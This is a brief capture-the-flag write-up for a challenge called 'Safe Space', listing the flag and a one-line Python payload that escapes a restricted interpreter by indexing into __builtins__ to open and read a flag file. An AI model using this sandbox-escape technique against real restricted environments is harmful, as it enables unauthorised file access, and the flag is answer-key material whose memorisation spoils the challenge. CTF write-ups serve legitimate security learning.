## Safe Space
flag: dctf{bur5t_y0ur_bubbl3}

### Solution
1. type `__builtins__` to get builtin funcs
2. now just need to make list of them and call them like that, open flag file and read lines
3. flag file is in FILE builtin var
4. so final command is: `list(__builtins__.values())[1](list(__builtins__.values())[0](list(__builtins__.values())[3]).readline())`
